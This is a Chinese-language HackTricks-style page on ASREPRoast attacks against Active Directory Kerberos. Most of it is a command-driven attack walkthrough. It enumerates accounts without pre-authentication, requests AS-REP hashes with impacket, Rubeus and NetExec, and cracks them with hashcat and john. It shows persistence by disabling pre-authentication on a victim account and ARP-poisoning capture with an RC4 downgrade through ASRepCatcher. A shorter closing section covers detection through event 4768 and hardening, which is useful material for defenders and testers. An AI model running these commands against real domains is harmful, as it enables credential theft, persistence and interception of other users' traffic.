# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast 是一种安全攻击，利用缺少 **Kerberos pre-authentication required attribute** 的用户。实质上，此漏洞允许攻击者在不需要用户密码的情况下，从 Domain Controller (DC) 请求用户身份验证。随后，DC 会返回一条使用用户密码派生密钥加密的消息，攻击者可以尝试在线下破解该消息，从而获取用户密码。

此攻击的主要要求包括：

- **缺少 Kerberos pre-authentication**：目标用户未启用此安全功能。
- **连接到 Domain Controller (DC)**：攻击者需要访问 DC，以发送请求并接收加密消息。
- **可选的 domain account**：拥有 domain account 后，攻击者可以通过 LDAP 查询更高效地识别存在漏洞的用户。没有该账户时，攻击者必须猜测用户名。

#### 枚举存在漏洞的用户（需要 domain credentials）
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### 请求 AS_REP 消息
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus 默认请求 **RC4**，因此事件 ID **4768** 通常显示 **preauth type 0** 和 **ticket encryption type 0x17**。如果添加 **`/aes`**（或目标已禁用 RC4），则应会看到 **AES etypes**。<sup>[[2]](#references)</sup>

#### 快速单行命令（Linux）

- 首先使用 Kerberos userenum 枚举潜在目标（例如从 leaked build paths 中获取）：`kerbrute userenum users.txt -d domain --dc dc.domain`
- 使用 NetExec 在没有有效凭据的情况下，对整个 username 列表执行 roast：`netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- 如果有凭据，可以让 NetExec 查询 LDAP，并为你请求所有可 roast 的账户：`netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- 如果输出以 **`$krb5asrep$23$`** 开头，则使用 Hashcat **`-m 18200`** 破解。如果以 **`$krb5asrep$17$`** 或 **`$krb5asrep$18$`** 开头，则优先使用 John **`--format=krb5asrep`**。<sup>[[1]](#references)[[2]](#references)</sup>

### 破解

不要假设每个 AS-REP roast 都是 RC4。现代工具可能根据请求或协商的 enctype 返回 **RC4**（`$krb5asrep$23$`）或 **AES**（`$krb5asrep$17$` / `$krb5asrep$18$`）。**`hashcat -m 18200`** 用于 **etype 23**，而 **John** 可直接处理 **17/18/23** 的 `krb5asrep`。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### 持久化

对于你拥有 **GenericAll** 权限（或可写入属性的权限）的用户，强制其不要求 **preauth**：
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Detection and hardening

一次成功的 roast 会在 DC 上生成一个 **4768** 事件，其 `Status=0x0` 且 `PreAuthType=0`。检测时不要强制要求 RC4：`TicketEncryptionType=0x17` 是一个有用的弱加密信号，但攻击者也可以请求 AES（事件日志值为 `0x11`/`0x12`）。在 Windows Server 2016 及更高版本中，安装 2025 年 1 月 14 日（或更新版本）的累积更新后，事件 4768 的版本 2 还会公开 `ClientAdvertizedEncryptionTypes`、账户/DC 支持的 etype 以及可用密钥。<sup>[[5]](#references)</sup>

一种实用的 hunting 方法是：标记仅通告 RC4、但账户拥有 AES 密钥的客户端，然后关联来自同一源 IP、针对多个无 pre-auth 用户的突发请求。应先建立合法例外的基线，而不是对每个 `PreAuthType=0` 事件都触发告警。

持久性的修复措施是：对所有不严格需要该设置的用户，清除 **Do not require Kerberos preauthentication**，并轮换已暴露账户的密码。如果无法移除例外，应使用随机生成的长密码并赋予最小权限。禁用 RC4 可以提高破解成本，但无法消除 roastability，因为 AES AS-REP 响应仍然可以被离线破解。<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast without credentials

在路径上的攻击者可以捕获正常、已 preauthenticated 的 AS 交换过程中返回的 AS-REP，并将其加密部分格式化，以进行离线破解。与经典的 ASREPRoasting 不同，这不要求 `DONT_REQ_PREAUTH`；但是，它只能获取实际被拦截 Kerberos 交换的账户。**ASRepCatcher** 默认通过单向 ARP poisoning 获取所需位置，也可以使用 `--disable-spoofing` 来接收来自其他 MitM 技术的流量。<sup>[[6]](#references)</sup>\
如果你想了解相关的无凭据技巧——从无 pre-auth principal 返回 **service ticket** 而不是 **TGT**——请参阅 [Kerberoast](kerberoast.md)。

在 `relay` 模式下，[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 会转发拦截到的 AS-REQ，并在双方仍允许 RC4 时强制使用 **RC4**。`listen` 不会修改数据包，因此会捕获客户端与 DC 协商出的 enctype。条件允许时，应使用 `-t`/`-tf` 限定 poisoning 范围，而不是影响整个子网。<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – 事件 4768：请求了 Kerberos 身份验证票证](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
